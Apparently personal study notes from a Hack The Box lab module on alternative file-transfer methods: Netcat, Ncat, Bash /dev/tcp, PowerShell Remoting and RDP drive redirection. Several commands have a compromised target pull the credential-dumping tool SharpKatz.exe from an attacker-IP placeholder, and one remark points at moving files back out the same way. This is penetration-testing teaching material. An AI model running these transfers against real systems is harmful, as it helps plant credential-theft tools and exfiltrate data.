# 📦 Miscellaneous File Transfer Methods

> [!info]+ 📌 Why This Matters  
> We have already covered file transfers using:
> 
> - 🌐 `wget` / `curl`
>     
> - 🔐 `SCP`
>     
> - 🐍 Programming languages
>     
> - 🖥️ Windows utilities
>     
> 
> But real environments can have restrictions that make one method unavailable.
> 
> This section introduces additional transfer mechanisms:
> 
> ```text
>              📦 File Transfer
>                    │
>       ┌────────────┼────────────┐
>       ▼            ▼            ▼
>    🐚 Netcat   🟦 PowerShell   🖥️ RDP
>       │          Remoting        │
>       ▼            │             ▼
>     TCP/UDP        ▼         Copy / Mount
>                 WinRM
> ```

---

# 🐚 1️⃣ Netcat & Ncat

> [!info]+ 🌐 What Is Netcat?  
> **Netcat (`nc`)** is a networking utility capable of reading from and writing to network connections using **TCP or UDP**.
> 
> This makes it useful for simple file-transfer operations.

### 🆚 Netcat vs Ncat

|Tool|Description|Notable Features|
|---|---|---|
|🐚 `nc`|Original Netcat|Simple TCP/UDP networking|
|🛡️ `ncat`|Modern Nmap implementation|SSL, IPv6, SOCKS, HTTP proxies, connection brokering|

> [!tip]+ 🧠 HTB/PwnBox Note  
> In the HTB PwnBox environment, **Ncat may be available through `nc`, `ncat`, and `netcat`**.

---

# 📥 2️⃣ Transfer a File with Netcat

> [!abstract]+ 🗺️ Basic Model  
> One machine **listens** and writes received data to a file.
> 
> The other machine **connects** and sends the file.
> 
> ```text
> 🖥️ Sender
>     │
>     │ TCP
>     ▼
> 🖥️ Receiver
>     │
>     ▼
> 💾 File
> ```

## 🎧 Receiver — Listen on Port 8000

### Original Netcat

```bash
nc -l -p 8000 > SharpKatz.exe
```

> [!note]+ 🧠 Command Breakdown
> 
> - `nc` → start Netcat
>     
> - `-l` → listen mode
>     
> - `-p 8000` → listen on port `8000`
>     
> - `>` → redirect received data
>     
> - `SharpKatz.exe` → output file
>     

### Ncat

```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

> [!info]+ 🔍 Why `--recv-only`?  
> With Ncat, `--recv-only` tells Ncat to **terminate when the receiving operation is complete**.

---

## 📤 Sender — Send the File

### Original Netcat

```bash
nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe
```

> [!note]+ 🧠 Important
> 
> ```text
> < SharpKatz.exe
>       │
>       ▼
> Standard Input → Netcat → Network
> ```

`-q 0` tells Netcat to close after the transfer finishes.

### Ncat

```bash
ncat --send-only <TARGET_IP> 8000 < SharpKatz.exe
```

> [!tip]+ ⚡ `--send-only`  
> `--send-only` causes Ncat to terminate once its input has been exhausted, rather than waiting for additional data from the remote side.

---

# 🔄 3️⃣ Reverse the Connection Direction

> [!warning]+ 🧱 Firewall Scenario  
> What if the compromised machine **cannot accept inbound connections**?
> 
> We can reverse the direction:
> 
> ```text
> ❌ Attack Host ───────► Target
>       blocked
> 
> ✅ Target ─────────────► Attack Host
>       allowed
> ```

The attack host listens, and the compromised machine connects outward. This can be useful when inbound connections to the target are blocked.

---

## 🎧 Attack Host — Listen

### Netcat

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### Ncat

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

---

## 📥 Target — Receive

### Netcat

```bash
nc <ATTACKER_IP> 443 > SharpKatz.exe
```

### Ncat

```bash
ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe
```

### 🔄 Overall Flow

```text
       🖥️ Attack Host
       ┌──────────────┐
       │ SharpKatz.exe│
       └──────┬───────┘
              │
              │ TCP/443
              ▼
       🖥️ Target
              │
              ▼
       SharpKatz.exe
```

---

# 🐚 4️⃣ Bash `/dev/tcp`

> [!info]+ 💡 Alternative When Netcat Is Missing  
> If neither `nc` nor `ncat` is available, Bash can perform TCP read/write operations using:
> 
> ```text
> /dev/tcp/<HOST>/<PORT>
> ```
> 
> Bash interprets this pseudo-device as a request to open a TCP connection.

### 📥 Receive a File

```bash
cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
```

### 🧠 Understand the Redirection

```text
/dev/tcp/<ATTACKER_IP>/443
            │
            ▼
      TCP Connection
            │
            ▼
           cat
            │
            ▼
      SharpKatz.exe
```

> [!success]+ ✅ Key Idea  
> `/dev/tcp` can provide a basic TCP transfer mechanism **without Netcat/Ncat being installed**.
> 
> The same concept can be used in the opposite direction for transferring files from the compromised host back to the attack host.

---

# 🧠 5️⃣ Netcat Cheat Sheet

|Situation|Receiver|Sender|
|---|---|---|
|Target receives|`nc -l -p 8000 > file`|`nc TARGET 8000 < file`|
|Ncat receives|`ncat -l -p 8000 --recv-only > file`|`ncat TARGET 8000 --send-only < file`|
|Target connects outward|`nc ATTACKER 443 > file`|`sudo nc -l -p 443 -q 0 < file`|
|Ncat outward connection|`ncat ATTACKER 443 --recv-only > file`|`sudo ncat -l -p 443 --send-only < file`|
|No Netcat|`cat < /dev/tcp/ATTACKER/443 > file`|Attack host listens|

> [!tip]+ 🧩 The Pattern to Memorize
> 
> ```text
> LISTEN + < FILE
>       ↓
>     SEND
> 
> CONNECT + > FILE
>       ↓
>    RECEIVE
> ```
> 
> The important thing is understanding **stdin/stdout redirection**.

---

# 🟦 6️⃣ PowerShell Remoting / WinRM

> [!info]+ 🪟 What Is PowerShell Remoting?  
> **PowerShell Remoting**, also known as **WinRM**, allows commands and scripts to be executed on remote Windows computers.
> 
> It can also be used for file-transfer operations when other protocols such as HTTP, HTTPS, or SMB aren't available.

### 🌐 Default WinRM Ports

|Protocol|Port|
|---|--:|
|HTTP|`TCP/5985`|
|HTTPS|`TCP/5986`|

> [!note]+ 🔐 Required Access  
> Creating a PowerShell Remoting session requires appropriate permissions, such as:
> 
> - 👑 Administrative access
>     
> - 👤 Membership in `Remote Management Users`
>     
> - 🔑 Explicit permissions in the PowerShell Remoting session configuration
>     

---

# 🔎 7️⃣ Check WinRM Connectivity

From `DC01`, the example checks whether `DATABASE01` is reachable on TCP/5985.

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Example:

```text
ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

> [!success]+ ✅ Successful Connection
> 
> ```text
> TcpTestSucceeded : True
> ```
> 
> means the TCP connection to the specified WinRM port succeeded.

---

# 🔗 8️⃣ Create a PowerShell Remoting Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

### 🧠 What Happens?

```text
DC01
 │
 │ New-PSSession
 ▼
DATABASE01
 │
 ▼
$Session
```

The `$Session` variable stores the PowerShell remoting session that can then be used for file operations.

---

# 📥 9️⃣ Copy Files with `Copy-Item`

PowerShell's `Copy-Item` can transfer files between the local machine and a remote PowerShell session.

## 📤 Local → Remote

```powershell
Copy-Item -Path C:\samplefile.txt `
    -ToSession $Session `
    -Destination C:\Users\Administrator\Desktop\
```

### 🔄 Direction

```text
DC01
C:\samplefile.txt
       │
       │ -ToSession
       ▼
DATABASE01
C:\Users\Administrator\Desktop\
```

---

## 📥 Remote → Local

```powershell
Copy-Item `
    -Path "C:\Users\Administrator\Desktop\DATABASE.txt" `
    -Destination C:\ `
    -FromSession $Session
```

### 🔄 Direction

```text
DATABASE01
DATABASE.txt
     │
     │ -FromSession
     ▼
DC01
C:\
```

> [!warning]+ ⚠️ Don't Mix Up the Direction
> 
> ```text
> -ToSession
>     ↓
> Local → Remote
> 
> -FromSession
>     ↓
> Remote → Local
> ```

---

# 🖥️ 🔟 RDP File Transfer

> [!info]+ 🖥️ Remote Desktop Protocol  
> **RDP** is commonly used for remote access in Windows environments.
> 
> Files can be transferred through:
> 
> - 📋 Copy & paste
>     
> - 💽 Redirected/mounted local drives
>     

The source notes that RDP file transfer behavior can vary depending on the client and environment.

---

# 📋 1️⃣1️⃣ RDP Copy & Paste

When connected to a Windows machine through RDP:

```text
Local Machine
      │
      │ Copy
      ▼
   Clipboard
      │
      │ Paste
      ▼
Remote RDP Session
```

> [!warning]+ ⚠️ Limitations  
> When connecting from Linux, tools such as:
> 
> - `xfreerdp`
>     
> - `rdesktop`
>     
> 
> may support copying files from the target into the RDP session, but this may not work in every scenario.

---

# 💽 1️⃣2️⃣ RDP Drive Redirection

Instead of copy/paste, we can expose a local directory inside the remote RDP session.

### 🐧 Using `rdesktop`

```bash
rdesktop <TARGET_IP> \
-d <DOMAIN> \
-u <USERNAME> \
-p '<PASSWORD>' \
-r disk:linux='/home/user/rdesktop/files'
```

### 🐧 Using `xfreerdp`

```bash
xfreerdp \
/v:<TARGET_IP> \
/d:<DOMAIN> \
/u:<USERNAME> \
/p:'<PASSWORD>' \
/drive:linux,/home/user/htb/filetransfer
```

> [!info]+ 📁 Accessing the Redirected Drive  
> Inside the Windows RDP session, the redirected resource can be accessed through:
> 
> ```text
> \\tsclient\
> ```
> 
> This allows files to be transferred between the local machine and the RDP session.

### 🔄 Drive Redirection

```text
🐧 Linux
/home/user/files
      │
      │ RDP Drive Redirection
      ▼
🪟 Windows RDP
\\tsclient\linux\
      │
      ▼
📁 Access Files
```

---

# 🛡️ 1️⃣3️⃣ Windows Defender Consideration

> [!danger]+ 🚨 Important Security Note  
> The HTB lab machine has **Windows Defender enabled**.
> 
> If you share a directory containing malware through RDP drive redirection, **Windows Defender may detect and delete those files on the local machine**.

> [!warning]+ 🧠 Important Distinction  
> This demonstrates an important security concept:
> 
> ```text
> File Transfer
>      │
>      ▼
> Destination Machine
>      │
>      ▼
> 🛡️ Antivirus / Defender
>      │
>      ├── Allow
>      └── Detect / Quarantine / Delete
> ```
> 
> A transfer mechanism working successfully does **not** mean the transferred file will necessarily remain available.

---

# 🔐 1️⃣4️⃣ RDP Native Windows Client

Windows also provides the native:

```text
mstsc.exe
```

Remote Desktop client.

> [!info]+ 🪟 Local Resource Sharing  
> The native RDP client can be configured to make local resources such as drives available inside the remote session.

> [!note]+ 👤 Session Isolation  
> The redirected drive is not accessible to other users logged onto the target, even if they hijack the RDP session.

---

# 🧠 1️⃣5️⃣ Complete Method Comparison

|Method|Main Transport|Direction|Important Requirement|
|---|---|:-:|---|
|🐚 Netcat|TCP/UDP|📥📤|`nc` available|
|🛡️ Ncat|TCP/UDP|📥📤|`ncat` available|
|🐚 `/dev/tcp`|TCP|📥📤|Bash with `/dev/tcp` support|
|🟦 PowerShell Remoting|WinRM|📥📤|Remoting + permissions|
|🖥️ RDP Copy/Paste|RDP|📥📤|RDP session/client support|
|💽 RDP Drive Redirection|RDP|📥📤|RDP client + drive redirection|

---

# ⚡ 1️⃣6️⃣ Quick Command Reference

## 🐚 Netcat

```bash
# Listen and receive
nc -l -p 8000 > file

# Connect and send
nc <TARGET_IP> 8000 < file
```

---

## 🛡️ Ncat

```bash
# Receive
ncat -l -p 8000 --recv-only > file

# Send
ncat --send-only <TARGET_IP> 8000 < file
```

---

## 🐚 Bash `/dev/tcp`

```bash
# Receive
cat < /dev/tcp/<ATTACKER_IP>/443 > file
```

---

## 🟦 PowerShell Remoting

```powershell
# Create session
$Session = New-PSSession -ComputerName <REMOTE_HOST>

# Local → Remote
Copy-Item -Path <LOCAL_FILE> `
    -ToSession $Session `
    -Destination <REMOTE_PATH>

# Remote → Local
Copy-Item -Path <REMOTE_FILE> `
    -Destination <LOCAL_PATH> `
    -FromSession $Session
```

---

## 🖥️ RDP Drive Sharing

```bash
# rdesktop
rdesktop <TARGET_IP> -r disk:linux='<LOCAL_DIRECTORY>'
```

```bash
# xfreerdp
xfreerdp /v:<TARGET_IP> /drive:linux,<LOCAL_DIRECTORY>
```

---

# 🧩 1️⃣7️⃣ Troubleshooting Mindset

> [!abstract]+ 🔎 When One Method Fails

```text
                 ❓ Need to transfer a file
                           │
                           ▼
                Is the usual tool available?
                     │             │
                    YES            NO
                     │             │
                     ▼             ▼
                Use it       Check alternatives
                                   │
                    ┌──────────────┼──────────────┐
                    ▼              ▼              ▼
                 Netcat        /dev/tcp       PowerShell
                    │                             │
                    └──────────────┬──────────────┘
                                   ▼
                                  RDP
```

> [!tip]+ 🧠 Think in Constraints  
> Before choosing a transfer method, consider:
> 
> - 🔌 Which ports are reachable?
>     
> - 🧱 Is inbound traffic blocked?
>     
> - 🌐 Is HTTP/HTTPS available?
>     
> - 🐚 Is Bash available?
>     
> - 🛠️ Is Netcat/Ncat installed?
>     
> - 🪟 Is PowerShell Remoting enabled?
>     
> - 🔐 Do you have the required permissions?
>     
> - 🖥️ Is RDP available?
>     
> - 🛡️ Will security software inspect the transferred file?
>     

---

# 🏁 Final Takeaway

> [!quote]+ 💡 The Main Idea  
> ==There is rarely only one way to transfer a file.==
> 
> ```text
>              📦 FILE TRANSFER
>                    │
>       ┌────────────┼────────────┐
>       ▼            ▼            ▼
>    🐚 Netcat    🟦 WinRM      🖥️ RDP
>       │            │            │
>       ▼            ▼            ▼
>     TCP/UDP     PowerShell    Clipboard
>       │          Sessions      / Drives
>       │            │            │
>       └────────────┼────────────┘
>                    ▼
>              🎯 Choose Based
>              on Constraints
> ```
> 
> The most important skill is understanding **which communication paths are available** and adapting the transfer method accordingly.
> 
> > [!success]+ 🧠 Muscle Memory  
> > Don't memorize only individual commands.
> > 
> > Learn to recognize the pattern:
> > 
> > **Available tool + reachable protocol + correct direction + sufficient permissions = viable transfer method.**
> 
> This becomes especially useful in labs where a particular transfer method is blocked and you need to switch to another one.